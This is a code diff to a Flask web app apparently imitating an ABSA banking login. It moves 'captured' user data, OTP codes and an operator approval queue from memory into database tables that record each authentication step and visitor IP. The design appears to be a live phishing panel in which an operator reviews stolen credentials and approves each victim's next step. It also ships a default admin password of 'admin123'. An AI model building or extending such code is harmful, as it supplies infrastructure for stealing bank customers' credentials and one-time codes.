@@ -1,16 +1,69 @@
 from flask import Flask, render_template, request, redirect, url_for, flash, session, jsonify
+from flask_sqlalchemy import SQLAlchemy
 import os
 import secrets
 import time
 from datetime import datetime, timedelta
 import uuid
+import json
 
 app = Flask(__name__)
 app.secret_key = os.environ.get('SECRET_KEY', secrets.token_hex(16))
 
+# Database configuration
+database_url = os.environ.get('DATABASE_URL')
+if database_url and database_url.startswith('postgres://'):
+    database_url = database_url.replace('postgres://', 'postgresql://', 1)
+
+app.config['SQLALCHEMY_DATABASE_URI'] = database_url or 'sqlite:///absa_banking.db'
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+
+db = SQLAlchemy(app)
+
 # Admin credentials (use environment variables in production)
 ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
 ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin123')
+
+# Database Models
+class UserSession(db.Model):
+    __tablename__ = 'user_sessions'
+    
+    id = db.Column(db.String(36), primary_key=True)
+    session_start = db.Column(db.DateTime, default=datetime.utcnow)
+    ip_address = db.Column(db.String(45))
+    status = db.Column(db.String(20), default='active')  # active, completed, abandoned
+    approved_at = db.Column(db.DateTime)
+    approved_by = db.Column(db.String(50))
+    rejected_at = db.Column(db.DateTime)
+    rejected_by = db.Column(db.String(50))
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+    
+    # Relationship to steps
+    steps = db.relationship('AuthStep', backref='session', lazy=True, cascade='all, delete-orphan')
+
+class AuthStep(db.Model):
+    __tablename__ = 'auth_steps'
+    
+    id = db.Column(db.Integer, primary_key=True)
+    session_id = db.Column(db.String(36), db.ForeignKey('user_sessions.id'), nullable=False)
+    step_name = db.Column(db.String(100), nullable=False)
+    step_data = db.Column(db.Text)  # JSON string of captured data
+    ip_address = db.Column(db.String(45))
+    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
+    
+class ApprovalRequest(db.Model):
+    __tablename__ = 'approval_requests'
+    
+    id = db.Column(db.String(36), primary_key=True)
+    session_id = db.Column(db.String(36), db.ForeignKey('user_sessions.id'), nullable=False)
+    step_name = db.Column(db.String(100), nullable=False)
+    next_url = db.Column(db.String(200))
+    user_data = db.Column(db.Text)  # JSON string
+    ip_address = db.Column(db.String(45))
+    status = db.Column(db.String(20), default='pending')  # pending, approved, rejected
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+    handled_at = db.Column(db.DateTime)
+    handled_by = db.Column(db.String(50))
 
 # In-memory storage for demo purposes (use database in production)
 users_db = {
@@ -30,31 +83,42 @@ users_db = {
     }
 }
 
-# Admin approval system
-approval_requests = {}
-handled_requests = {'approved': [], 'rejected': []}
-
-# Store captured user data
-captured_data = {}
-
 # Session management
 login_attempts = {}
 otp_codes = {}
 
-# Helper functions for admin approval
+# Initialize database
+with app.app_context():
+    db.create_all()
+
+# Helper functions for admin approval (updated to use database)
 def create_approval_request(session_id, step_name, next_url, user_data=None):
     """Create a new approval request with user data"""
     request_id = str(uuid.uuid4())
-    approval_requests[request_id] = {
-        'id': request_id,
-        'session_id': session_id,
-        'step_name': step_name,
-        'next_url': next_url,
-        'created_at': datetime.now(),
-        'status': 'pending',
-        'user_data': user_data or {},
-        'ip_address': request.remote_addr if request else 'Unknown'
-    }
+    
+    # Create or get user session
+    user_session = UserSession.query.get(session_id)
+    if not user_session:
+        user_session = UserSession(
+            id=session_id,
+            ip_address=request.remote_addr if request else 'Unknown'
+        )
+        db.session.add(user_session)
+        db.session.commit()
+    
+    # Create approval request
+    approval_request = ApprovalRequest(
+        id=request_id,
+        session_id=session_id,
+        step_name=step_name,
+        next_url=next_url,
+        user_data=json.dumps(user_data) if user_data else '{}',
+        ip_address=request.remote_addr if request else 'Unknown'
+    )
+    
+    db.session.add(approval_request)
+    db.session.commit()
+    
     return request_id
 
 def require_admin_approval(step_name, next_route):
@@ -75,17 +139,26 @@ def require_admin_approval(step_name, next_route):
 
 def store_user_data(session_id, step_name, data):
     """Store user data for admin review"""
-    if session_id not in captured_data:
-        captured_data[session_id] = {
-            'session_start': datetime.now(),
-            'steps': {}
-        }
+    # Create or get user session
+    user_session = UserSession.query.get(session_id)
+    if not user_session:
+        user_session = UserSession(
+            id=session_id,
+            ip_address=request.remote_addr if request else 'Unknown'
+        )
+        db.session.add(user_session)
+        db.session.flush()  # Get the ID without committing
     
-    captured_data[session_id]['steps'][step_name] = {
-        'timestamp': datetime.now(),
-        'data': data,
-        'ip_address': request.remote_addr if request else 'Unknown'
-    }
+    # Create auth step record
+    auth_step = AuthStep(
+        session_id=session_id,
+        step_name=step_name,
+        step_data=json.dumps(data),
+        ip_address=request.remote_addr if request else 'Unknown'
+    )
+    
+    db.session.add(auth_step)
+    db.session.commit()
 
 @app.route('/')
 def index():
@@ -393,11 +466,12 @@ def logout():
 @app.route('/health')
 def health_check():
     """Health check endpoint for monitoring"""
+    pending_count = ApprovalRequest.query.filter_by(status='pending').count()
     return jsonify({
         'status': 'healthy',
         'timestamp': datetime.now().isoformat(),
         'version': '1.0.0',
-        'pending_requests': len([req for req in approval_requests.values() if req['status'] == 'pending'])
+        'pending_requests': pending_count
     })
 
 @app.route('/api/branch-lookup')
